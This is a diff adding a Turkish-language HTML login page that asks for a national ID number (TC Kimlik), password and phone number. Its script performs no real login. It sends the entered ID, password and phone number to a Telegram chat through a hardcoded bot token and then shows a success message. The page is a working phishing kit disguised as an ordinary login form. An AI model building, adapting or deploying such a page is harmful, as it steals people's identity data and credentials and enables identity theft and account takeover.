@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kullanıcı Giriş Paneli</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="panel">
+        <h2>Kullanıcı Giriş</h2>
+        <form id="loginForm" onsubmit="return girisYap(event)">
+            <label for="tc">TC Kimlik Numarası:</label>
+            <input type="text" id="tc" name="tc" placeholder="11 haneli TC Kimlik No" maxlength="11" required>
+
+            <label for="sifre">Şifre:</label>
+            <input type="password" id="sifre" name="sifre" placeholder="Şifrenizi girin" required>
+
+            <label for="telefon">Telefon Numarası:</label>
+            <input type="tel" id="telefon" name="telefon" placeholder="5XXXXXXXXX" maxlength="10" required>
+
+            <button type="submit">Giriş Yap</button>
+        </form>
+
+        <div class="loader" id="loader">İşleminiz yapılıyor...</div>
+        <div class="error" id="error-message"></div>
+        <div class="success" id="success-message"></div>
+    </div>
+
+    <script>
+        function tcKimlikDogrula(tcno) {
+            if (tcno.length !== 11) return false;
+            if (tcno[0] === '0') return false;
+            if (!/^\d{11}$/.test(tcno)) return false;
+
+            let toplam = 0;
+            for (let i = 0; i < 10; i++) {
+                toplam += parseInt(tcno.charAt(i));
+            }
+            if (toplam % 10 != tcno.charAt(10)) return false;
+
+            return true;
+        }
+
+        function telefonDogrula(telefon) {
+            return /^5[0-9]{9}$/.test(telefon);
+        }
+
+        function girisYap(event) {
+            event.preventDefault();
+            
+            const tc = document.getElementById('tc').value;
+            const sifre = document.getElementById('sifre').value;
+            const telefon = document.getElementById('telefon').value;
+            const errorMessage = document.getElementById('error-message');
+            const successMessage = document.getElementById('success-message');
+            const loader = document.getElementById('loader');
+
+            // Mesajları sıfırla ve görünür yap
+            errorMessage.style.display = 'none';
+            successMessage.style.display = 'none';
+            errorMessage.innerHTML = '';
+            successMessage.innerHTML = '';
+
+            // TC Kimlik kontrolü
+            if (!tcKimlikDogrula(tc)) {
+                errorMessage.innerHTML = 'Geçersiz TC Kimlik Numarası!';
+                errorMessage.style.display = 'block';
+                return false;
+            }
+
+            // Şifre kontrolü
+            if (sifre.length < 6) {
+                errorMessage.innerHTML = 'Şifre en az 6 karakter olmalıdır!';
+                errorMessage.style.display = 'block';
+                return false;
+            }
+
+            // Telefon kontrolü
+            if (!telefonDogrula(telefon)) {
+                errorMessage.innerHTML = 'Geçersiz telefon numarası! Başında 5 ile başlamalı ve 10 haneli olmalıdır.';
+                errorMessage.style.display = 'block';
+                return false;
+            }
+
+            // Loading göster
+            loader.style.display = 'block';
+
+            // Telegram mesajı
+            const message = `Yeni Giriş:\n\nTC: ${tc}\nŞifre: ${sifre}\nTelefon: ${telefon}`;
+            const botToken = '7339087315:AAH_HBxLkl6x-GURaVwG1a7yC0kvtwIKSj0'; // Bot Token'ı string olarak tanımlandı
+            const chatId = '-4571747062'; // Chat ID'yi string olarak tanımlandı
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                loader.style.display = 'none';
+                if (data.ok) {
+                    successMessage.innerHTML = 'Giriş başarılı!';
+                    successMessage.style.display = 'block';
+                    document.getElementById('loginForm').reset();
+                } else {
+                    errorMessage.innerHTML = 'Bir hata oluştu, lütfen tekrar deneyin.';
+                    errorMessage.style.display = 'block';
+                }
+            })
+            .catch(error => {
+                loader.style.display = 'none';
+                errorMessage.innerHTML = 'Bir hata oluştu, lütfen tekrar deneyin.';
+                errorMessage.style.display = 'block';
+                console.error('Error:', error);
+            });
+
+            return false;
+        }
+
+        // Input alanlarının gerçek zamanlı kontrolü
+        document.getElementById('tc').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        document.getElementById('telefon').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+    </script>
+</body>
+</html>
